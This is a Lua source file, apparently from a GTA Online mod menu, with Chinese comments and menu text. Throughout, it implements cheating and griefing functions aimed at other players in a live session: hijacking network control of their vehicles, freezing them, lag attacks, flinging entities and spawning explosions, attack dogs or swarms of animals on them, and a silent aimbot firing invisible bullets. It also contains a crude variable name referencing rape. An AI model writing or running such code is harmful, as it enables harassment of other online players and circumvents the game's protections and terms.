    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    RGBNeonKit(pedm)
    VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color)

end

function Changecolor(pid, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    GetControl(vmod, spec, pid)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    VEHICLE.SET_VEHICLE_COLOURS(vmod, color.prim, color.sec)
end

function ACutil(text)
   return util.toast(text)
end

function GetPlayVeh(pid, opt)

    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    local spec = GetSpec(pid)
    if set.alert then
        ACutil(Str_trans('获得对车辆的控制'))
    end
    if Disbet(pid) > 750000 then
        Specon(pid)
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then
            opt()
            if not spec then
                Specoff(pid)
            end
            return
        else
            if set.alert then
            ACutil(Str_trans('玩家不在车内'))
            end
            Specoff(pid)
        end
    elseif Disbet(pid) < 750000 then
        if PED.IS_PED_IN_ANY_VEHICLE(pedm, true) then
            opt()
            if not spec then
                Specoff(pid)
            end
        return
        end
    else
        if set.alert then
            ACutil(Str_trans('玩家不在车内'))
        end
    end
end

function Disbet(pid)
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local play = ENTITY.GET_ENTITY_COORDS(players.user_ped(), true)
    local disbet = GENERIC_SYSTEM.VDIST2(play.x, play.y, play.z, tar1.x, tar1.y, tar1.z)
    return disbet
end

    function Rolladown(pid)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
        local spec = GetSpec(pid)
        GetControl(pedm, spec, pid)
        VEHICLE.ROLL_DOWN_WINDOWS(vmod)
    end

    function Rollaup(pid)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
        local spec = GetSpec(pid)
        GetControl(pedm, spec, pid)
        for i = 0, 7 do
            VEHICLE.ROLL_UP_WINDOW(vmod, i)
        end
    end

    function Rolldindivid(pid, win)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
        local spec = GetSpec(pid)
        GetControl(pedm, spec, pid)
        VEHICLE.ROLL_DOWN_WINDOW(vmod, win)
    end

    function Rolluindivid(pid, win)
        local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
        local spec = GetSpec(pid)
        GetControl(pedm, spec, pid)
        VEHICLE.ROLL_UP_WINDOW(vmod, win)
    end
--撒尿
function peeloop_player(pid)
    if state then 
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)
        request_ptfx_asset_peeloop("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false) 
    else
        GRAPHICS.STOP_PARTICLE_FX_LOOPED(ptfx_id, false)
    end
end
--骑乘
function piggy_back(pid, on)
    if players.user() == pid then return end
    usingPiggyback = on
    if usingPiggyback then
        usingRape = false
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
       STREAMING.REQUEST_ANIM_DICT("rcmjosh2")
       while not STREAMING.HAS_ANIM_DICT_LOADED("rcmjosh2") do
            wait()
        end
        local boneId = PED.GET_PED_BONE_INDEX(target, 0xDD1C)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(
           players.user_ped(),
            target,
            boneId,
            0.0, -0.2, 0.65,
           0.0, 0.0, 180.0,
            false, true, false, false, 0, true, 0)
        TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmjosh2", "josh_sitting_loop", 8.0, -8.0, -1, 1, 0.0, false, false, false)

       while usingPiggyback and is_player_active(pid, false, true) and
       not util.is_session_transition_active() do
           wait()
       end
       usingPiggyback = false
       TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
       ENTITY.DETACH_ENTITY(players.user_ped(), true, false)
   end
end
--烟雾掉帧
function smokelagg(pid) 
        if players.exists(pid) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
            local player_pos = players.get_position(pid)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset_peeloop("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end

local yeetMultiplier = 1000
local yeetRange = 1000
local stormDelay = new.delay(1, 0, 0)  
function yeetEntities()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local targetPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        --local targetPos = players.get_position(pid)
        local pointerTables = {
            entities.get_all_peds_as_pointers(),
            entities.get_all_vehicles_as_pointers()
        }
        local range = yeetRange * yeetRange --squaring it, for VDIST2
        for _, pointerTable in pairs(pointerTables) do
            for _, entityPointer in pairs(pointerTable) do
                local entityPos = entities.get_position(entityPointer)
                local distance = v3.distance(targetPos, entityPos)
                if distance < range then
                    local entityHandle = entities.pointer_to_handle(entityPointer)
                    --check the entity is a ped in a car
                    if (ENTITY.IS_ENTITY_A_PED(entityHandle) and (not PED.IS_PED_IN_ANY_VEHICLE(entityHandle, true) and (not PED.IS_PED_A_PLAYER(entityHandle)))) or (not ENTITY.IS_ENTITY_A_PED(entityHandle))--[[for the vehicles]] then
                        local playerList = players.list(true, true, true)
                        if not ENTITY.IS_ENTITY_A_PED(entityHandle) then
                            for _, pid in pairs(playerList) do
                                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                                if PED.GET_VEHICLE_PED_IS_IN(ped, false) == entityHandle then goto skip end --if the entity is a players car ignore it
                            end
                        end
                        local localTargetPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entityHandle)
                        v3.sub(localTargetPos, entityPos) --subtract here, for launch.
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(entityHandle, 1, v3.getX(localTargetPos) * yeetMultiplier, v3.getY(localTargetPos) * yeetMultiplier, v3.getZ(localTargetPos) * yeetMultiplier, true, false, true, true)
                        ::skip::
                    end
                end
            end
        end
    end
--实体风暴
function chaoshita(pid) 
yeetEntities()
        wait(getTotalDelay(stormDelay))
        if not players.exists(pid) then util.stop_thread() end
end

function Get_Waypoint_Pos2()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
        return waypoint_pos
    else
        util.toast("未标记地点")
    end
end

function EaseOutCubic(x)
    return 1 - ((1-x) ^ 3)
end

function EaseInOutCubic(x) --Thank you QUICKNET for re-writing this function!
    if(x < 0.5) then
        return 4 * x * x * x;
    else
        return 1 - ((-2 * x + 2) ^ 3) / 2
    end
end

local WhiteText = {r = 1.0, g = 1.0, b = 1.0, a = 1.0}

function SmoothTeleportToCord(v3coords, teleportFrame)
    local wppos = v3coords
    local localped = PLAYER.GET_PLAYER_PED(players.user())
    if wppos ~= nil then --cam setup here
        if not CAM.DOES_CAM_EXIST(CCAM) then
            CAM.DESTROY_ALL_CAMS(true)
            CCAM = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
            CAM.SET_CAM_ACTIVE(CCAM, true)
            CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
        end
        --
        if teleportFrame then
            util.create_tick_handler(function ()
                if CAM.DOES_CAM_EXIST(CCAM) then
                    local tickCamCoord = CAM.GET_CAM_COORD(CCAM)
                    if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then --if they not in a vehicle
                        ENTITY.SET_ENTITY_COORDS(localped, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) --teleport the player
                    else
                        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                        ENTITY.SET_ENTITY_COORDS(veh, tickCamCoord.x, tickCamCoord.y, tickCamCoord.z, false, false, false, false) --teleport the vehicle
                    end
                else
                    return false
                end
            end)
        end
        --
        local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
        --
        for i = 0, 1, STP_SPEED_MODIFIER do --make the cam move up here
            CAM.SET_CAM_COORD(CCAM, pc.x, pc.y, pc.z + EaseOutCubic(i) * STP_COORD_HEIGHT)
            directx.draw_text(0.5, 0.5, tostring(EaseOutCubic(i) * STP_COORD_HEIGHT), 1, 0.6, WhiteText, false)
            local look = util.v3_look_at(CAM.GET_CAM_COORD(CCAM), pc)
            CAM.SET_CAM_ROT(CCAM, look.x, look.y, look.z, 2)
            wait()
        end
        --CAM.DO_SCREEN_FADE_OUT(1000) --fade out the screen
        ------------
        local currentZ = CAM.GET_CAM_COORD(CCAM).z
        local coordDiffx = wppos.x - pc.x
        local coordDiffxy = wppos.y - pc.y
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do --make the camera on x/y plane
            CAM.SET_CAM_COORD(CCAM, pc.x + (EaseInOutCubic(i) * coordDiffx), pc.y + (EaseInOutCubic(i) * coordDiffxy), currentZ)
            wait()
        end
        -- local groundZ = PATHFIND.GET_APPROX_HEIGHT_FOR_POINT(wppos.x, wppos.y)
        -- ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, groundZ, false, false, false, false)
        local success, ground_z
        repeat
            STREAMING.REQUEST_COLLISION_AT_COORD(wppos.x, wppos.y, wppos.z)
            success, ground_z = util.get_ground_z(wppos.x, wppos.y)
            wait()
        until success
        if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then --if they not in a vehicle
            ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, ground_z, false, false, false, false) --teleport the player
        else
            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
            local v3Out = memory.alloc()
            local headOut = memory.alloc()
            PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(wppos.x, wppos.y, ground_z, v3Out, headOut, 1, 3.0, 0)
            local head = memory.read_float(headOut)
            memory.free(headOut)
            memory.free(v3Out)
            ENTITY.SET_ENTITY_COORDS(veh, wppos.x, wppos.y, ground_z, false, false, false, false) --teleport the vehicle
            ENTITY.SET_ENTITY_HEADING(veh, head)
        end
        wait()
        local pc2 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
        local coordDiffz = CAM.GET_CAM_COORD(CCAM).z - ground_z -2
        local camcoordz = CAM.GET_CAM_COORD(CCAM).z
        --CAM.DO_SCREEN_FADE_IN(2000) --fade in the screen
        for i = 0, 1, STP_SPEED_MODIFIER / 2 do --move the camera down
            local pc23 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))-- extra for x/y
            CAM.SET_CAM_COORD(CCAM, pc23.x, pc23.y, camcoordz - (EaseOutCubic(i) * coordDiffz))
            wait()
        end
        -------------
        ----
        wait()
        --camera deletion here
        CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
        if CAM.IS_CAM_ACTIVE(CCAM) then
            CAM.SET_CAM_ACTIVE(CCAM, false)
        end
        CAM.DESTROY_CAM(CCAM, true)
    else
        util.toast("没标点！")
    end
end

function requestModels(...)
    local arg = { ... }
    for _, model in ipairs(arg) do
        if not STREAMING.IS_MODEL_VALID(model) then
            error("tried to request an invalid model")
        end
        STREAMING.REQUEST_MODEL(model)
        while not STREAMING.HAS_MODEL_LOADED(model) do
            wait()
        end
    end
end

function uforq(pid) 
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    STREAMING.REQUEST_MODEL(ufo)
    while not STREAMING.HAS_MODEL_LOADED(ufo) do
        STREAMING.REQUEST_MODEL(ufo)
        wait()
    end
    menu.trigger_commands("freeze".. players.get_name(pid).. " on")
    c.z = c.z + 10
    local spawnedufo = entities.create_object(ufo, c) --creates ufo
    wait(2000)
    c = ENTITY.GET_ENTITY_COORDS(p)
    FIRE.ADD_EXPLOSION(c.x, c.y, c.z, exp, 100.0, true, false, 3.0, false)
    wait(1000)
    entities.delete_by_handle(spawnedufo)
    menu.trigger_commands("freeze".. players.get_name(pid).. " off")
end
--关门放狗
function sendog(pid)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i = 1, 20 do
		send_attacker(-1788665315, pid, false)
		wait(1)
        end
		local coords = ENTITY.GET_ENTITY_COORDS(ped, true)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local hash = 779277682
        request_model_load(hash)
        local cage1 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.SET_ENTITY_ROTATION(cage1, 0.0, -90.0, 0.0, 1, true)
        local cage2 = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.SET_ENTITY_ROTATION(cage2, 0.0, 90.0, 0.0, 1, true)
end
--掉猴子
function sendmonkey(pid)
    PlayerName = PLAYER.GET_PLAYER_NAME(pid)
    local hash = util.joaat("a_c_chimp")
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        STREAMING.REQUEST_MODEL(hash)
        wait()
    end
    for i = 1, 69 do
        PlayerCoords = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        MonkeCoords = {
            ["x"] = PlayerCoords.x,
            ["y"] = PlayerCoords.y,
            ["z"] = PlayerCoords.z + 3
        }
        entities.create_ped(28, hash, MonkeCoords, 0)
        wait(50)
    end
end
--掉cxk
function sendcxk(pid)
    PlayerName = PLAYER.GET_PLAYER_NAME(pid)
    local hash = util.joaat("a_c_hen")
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        STREAMING.REQUEST_MODEL(hash)
        wait()
    end
    for i = 1, 69 do
        PlayerCoords = NETWORK._NETWORK_GET_PLAYER_COORDS(pid)
        MonkeCoords = {
            ["x"] = PlayerCoords.x,
            ["y"] = PlayerCoords.y,
            ["z"] = PlayerCoords.z + 3
        }
        entities.create_ped(28, hash, MonkeCoords, 0)
        wait(50)
    end
end

local function tpTableToPlayer(tbl, pid)
    if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        for _, v in pairs(tbl) do
            if (not PED.IS_PED_A_PLAYER(v)) then
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(v, c.x, c.y, c.z, false, false, false)
            end
        end
    end
end
function TpAllPeds(player)
    local pedHandles = entities.get_all_peds_as_handles()
    tpTableToPlayer(pedHandles, player)
end
function TpAllVehs(player)
    local vehHandles = entities.get_all_vehicles_as_handles()
    tpTableToPlayer(vehHandles, player)
end
function TpAllObjects(player)
    local objHandles = entities.get_all_objects_as_handles()
    tpTableToPlayer(objHandles, player)
end
function TpAllPickups(player)
    local pickupHandles = entities.get_all_pickups_as_handles()
    tpTableToPlayer(pickupHandles, player)
end


local function fastNet(entity, playerID)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
        for i = 1, 30 do
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
                wait(10)
            else
                goto continue
            end    
        end
    end
    ::continue::
    if SE_Notifications then
        util.toast("有控制权.")
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    wait(10)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    wait(10)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerID, true)
    wait(10)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    wait(10)
    ENTITY._SET_ENTITY_CLEANUP_BY_ENGINE(entity, false)
    wait(10)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    wait(10)
    if BA_visible then
        ENTITY.SET_ENTITY_VISIBLE(entity, true, 0)
    else
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
        wait()
        ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
    end
end

function qfmq(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local forwardOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 4, 0)
    local pheading = ENTITY.GET_ENTITY_HEADING(ped)
    local hash = 309416120
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do wait() end
    local a1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z - 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(a1, pheading + 90)
    fastNet(a1, pid)
    local b1 = OBJECT.CREATE_OBJECT(hash, forwardOffset.x, forwardOffset.y, forwardOffset.z + 1, true, true, true)
    ENTITY.SET_ENTITY_HEADING(b1, pheading + 90)
    fastNet(b1, pid)
    wait(500)
    entities.delete_by_handle(a1)
    entities.delete_by_handle(b1)
end

local function getPlayerName_pid(pid)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(pid)
    return playerName
end

--陨石掉落
function start_meteor_shower()
    meteor_thr = util.create_thread(function(thr)
        while true do
            if not meteors then
                util.stop_thread()
            end
            local rand_1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 300.0)
            local rand_2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-500, 500), math.random(-500, 500), 0.0)
            local diff = {}
            local speed = 200
            diff.x = (rand_2['x'] - rand_1['x'])*speed
            diff.y = (rand_2['y'] - rand_1['y'])*speed
            diff.z = (rand_2['z'] - rand_1['z'])*speed
            local h = 3751297495
            request_model_load(h)
            rand_1.x = rand_1['x']
            rand_1.y = rand_1['y']
            rand_1.z = rand_1['z']
            local meteor = OBJECT.CREATE_OBJECT_NO_OFFSET(h, rand_1['x'], rand_1['y'], rand_1['z'], true, false, false)
            ENTITY.SET_ENTITY_HAS_GRAVITY(meteor, true)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(meteor, 4, diff.x, diff.y, diff.z, true, false, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(meteor, 2, diff.x, diff.y, diff.z, 0, 0, 0, 0, true, false, true, false, true)
            OBJECT.SET_OBJECT_PHYSICS_PARAMS(meteor, 100000, 5, 1, 0, 0, .5, 0, 0, 0, 0, 0)
            wait(100)
        end
    end)
end


function letcarlagging(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
   if PED.IS_PED_IN_ANY_VEHICLE(ped) then
       local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
       local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
       local oldcoords = ENTITY.GET_ENTITY_COORDS(ped)
       wait(500)
       local nowcoords = ENTITY.GET_ENTITY_COORDS(ped)
       for a = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
       wait(200)
       for b = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
       for c = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, nowcoords.x, nowcoords.y, nowcoords.z, false, false, false)
       for d = 1, 10 do
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
           wait()
       end
       ENTITY.SET_ENTITY_VELOCITY(veh, velocity.x, velocity.y, velocity.z)
       wait(500)
   else
       util.toast("玩家 " .. getPlayerName_pid(pid) .. " 不在车内")
   end
end


overlay_x = 0.0052
overlay_y = 0.18519
size = 0.03
boxMargin = size / 7
overlay_x = 0.0400
overlay_y = 0.1850
key_text_color = newColor(1, 1, 1, 1)
background_colour = newColor(0, 0, 0, 0.2)
pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
spaceBarLength = 3
spaceBarSlim = 1
altSpaceBar = 0
wasd = {
    [1]  = { keys = {44, 52, 85, 138, 141, 152, 205, 264},                                               pressed = false, key = 'Q',     show = true },
    [2]  = { keys = {32, 71, 77, 87, 129, 136, 150, 232},                                                pressed = false, key = 'W',     show = true },
    [3]  = { keys = {38, 46, 51, 54, 86, 103, 119, 153, 184, 206, 350, 351, 355, 356},                   pressed = false, key = 'E',     show = true },
    [4]  = { keys = {45, 80, 140, 250, 263, 310},                                                        pressed = false, key = 'R',     show = true },
    [5]  = { keys = {34 ,63, 89, 133, 147, 234, 338},                                                    pressed = false, key = 'A',     show = true },
    [6]  = { keys = {8, 31, 33, 72, 78, 88, 130, 139, 149, 151, 196, 219, 233, 268, 269, 302},           pressed = false, key = 'S',     show = true },
    [7]  = { keys = {9, 30, 35, 59, 64, 90, 134, 146, 148, 195, 218, 235, 266, 267, 278, 279, 339, 342}, pressed = false, key = 'D',     show = true },
    [8]  = { keys = {23, 49, 75, 145, 185, 251},                                                         pressed = false, key = 'F',     show = true },
    [9]  = { keys = {21, 61, 131, 155, 209, 254, 340, 352},                                              pressed = false, key = 'Shift', show = true },
    [10] = { keys = {36, 60, 62, 132, 224, 280, 281, 326, 341, 343},                                     pressed = false, key = 'Ctrl',  show = true },
    [11] = { keys = {18, 22, 55, 76, 102, 143, 179, 203, 216, 255, 298, 321, 328, 353},                  pressed = false, key = 'Space', show = true },
}

pedToggleLoops = {
    {name = '摔倒NPC', command = 'JSragdollPeds', description = '让附近的所有NPC都摔倒 嘿嘿', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        PED.SET_PED_TO_RAGDOLL(ped, 2000, 2000, 0, true, true, true)
    end},
    {name = '死亡接触', command = 'JSdeathTouch', description = '杀死所有碰到您的NPC', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) or PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not ENTITY.IS_ENTITY_TOUCHING_ENTITY(ped, players.user_ped()) then return end
        ENTITY.SET_ENTITY_HEALTH(ped, 0, 0)
    end},
    {name = '寒冷NPC', command = 'JScoldPeds', description = '移除附近NPC的热特征', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 0)
    end},
    {name = '静音NPC', command = 'JSmutePeds', description = '因为我不想再听到那个家伙谈论他的同性恋狗啦', action = function(ped)
        if PED.IS_PED_A_PLAYER(ped) then return end
        AUDIO.STOP_PED_SPEAKING(ped, true)
    end},
    {name = 'NPC喇叭加速', command = 'JSnpcHornBoost', description = '当NPC按喇叭时会加速他们的载具', action = function(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if PED.IS_PED_A_PLAYER(ped) or not PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not AUDIO.IS_HORN_ACTIVE(vehicle) then return end
        AUDIO.SET_AGGRESSIVE_HORNS(true) --Makes pedestrians sound their horn longer, faster and more agressive when they use their horn.
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, ENTITY.GET_ENTITY_SPEED(vehicle) + 1.2)
    end, onStop = function()
        AUDIO.SET_AGGRESSIVE_HORNS(false)
    end},
    {name = 'NPC警笛加速', command = 'JSnpcSirenBoost', description = '当NPC驾驶警车响起警笛时\n此功能会加速他们的载具喔', action = function(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if PED.IS_PED_A_PLAYER(ped) or not PED.IS_PED_IN_ANY_VEHICLE(ped, true) or not VEHICLE.IS_VEHICLE_SIREN_ON(vehicle) then return end
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, ENTITY.GET_ENTITY_SPEED(vehicle) + 1.2)
    end},
    {name = '自动杀死敌人', command = 'JSautokill', description = '立即击杀对您有敌意的NPC', action = function(ped) --basically copy pasted form wiri script
        local rel = PED.GET_RELATIONSHIP_BETWEEN_PEDS(players.user_ped(), ped)
        if PED.IS_PED_A_PLAYER(ped) or ENTITY.IS_ENTITY_DEAD(ped) or not( (rel == 4 or rel == 5) or PED.IS_PED_IN_COMBAT(ped, players.user_ped()) ) then return end
        ENTITY.SET_ENTITY_HEALTH(ped, 0, 0)
    end},
}

----pvphelper
function GetTableFromV3Instance(v3int)
    local tbl = {x = v3.getX(v3int), y = v3.getY(v3int), z = v3.getZ(v3int)}
    return tbl
end

function SE_add_owned_explosion(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
    FIRE.ADD_OWNED_EXPLOSION(ped, x, y, z, exptype, dmgscale, isheard, isinvis, camshake)
end

function DistanceBetweenTwoCoords(v3_1, v3_2)
    local distance = math.sqrt(((v3_2.x - v3_1.x)^2) + ((v3_2.y - v3_1.y)^2) + ((v3_2.z - v3_1.z)^2))
    return distance
end

AIM_WHITELIST = {}

Silent_Aimbot = {
    hitboxes = {
        head = {hash = 12844, toggled = false},
        spine = {hash = 24817, toggled = false},
        pelvis = {hash = 11816, toggled = false},
    },

    fov = 2,
    dist = 300,
    dmg = 100,

    los_check = true,
    fov_check = true,

    hash = 177293209, --heavy sniper mk2 hash
    advanced = {
        speed = -1
    }
}

function pid_to_handle(pid)
    WIRI_NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, memory.alloc(13*8), 13)
    return memory.alloc(13*8)
end

saimbot_mode = "closest"
function get_aimbot_target()
    local dist = 1000000000
    local cur_tar = 0
    for k,v in pairs(entities.get_all_peds_as_handles()) do
        local target_this = true
        local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        local ped_pos = ENTITY.GET_ENTITY_COORDS(v, true)
        local this_dist = MISC.GET_DISTANCE_BETWEEN_COORDS(player_pos['x'], player_pos['y'], player_pos['z'], ped_pos['x'], ped_pos['y'], ped_pos['z'], true)
        if PLAYER.PLAYER_PED_ID() ~= v and not ENTITY.IS_ENTITY_DEAD(v) then
            if not satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not satarget_npcs then
                if not PED.IS_PED_A_PLAYER(v) then
                    target_this = false
                end
            end
            if not ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(PLAYER.PLAYER_PED_ID(), v, 17) then
                target_this = false
            end
            if satarget_usefov then
                if not PED.IS_PED_FACING_PED(PLAYER.PLAYER_PED_ID(), v, sa_fov) then
                    target_this = false
                end
            end
            if satarget_novehicles then
                if PED.IS_PED_IN_ANY_VEHICLE(v, true) then
                    target_this = false
                end
            end
            if satarget_nogodmode then
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(v) then
                    target_this = false
                end
            end
            if not satarget_targetfriends and satarget_players then
                if PED.IS_PED_A_PLAYER(v) then
                    local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(v)
                    local hdl = pid_to_handle(pid)
                    if NETWORK.NETWORK_IS_FRIEND(hdl) then
                        target_this = false
                    end
                end
            end
            if saimbot_mode == "closest" then
                if this_dist <= dist then
                    if target_this then
                        dist = this_dist
                        cur_tar = v
                    end
                end
            end
        end
    end
    return cur_tar
end

function ShootSingleBulletBetweenCoords(coords1, coords2, dmg, weaponhash, ownerped, audible, invisible, speed)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
        coords1.x, coords1.y, coords1.z,
        coords2.x, coords2.y, coords2.z,
        dmg, true, weaponhash, ownerped, audible, invisible, speed)
end

function ShootBulletAtPedBone(ped, boneID, dmg, weaponHash, speed)
    local bonecoords = PED.GET_PED_BONE_COORDS(ped, boneID, 0, 0, 0)
    local ourped = GetLocalPed()

    local ourhead = PED.GET_PED_BONE_COORDS(ourped, 12844, 0, 0, 0); local ourfront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ourped, 0, 1, 0)
    ourfront.z = ourhead.z --to shoot out of infront of our head
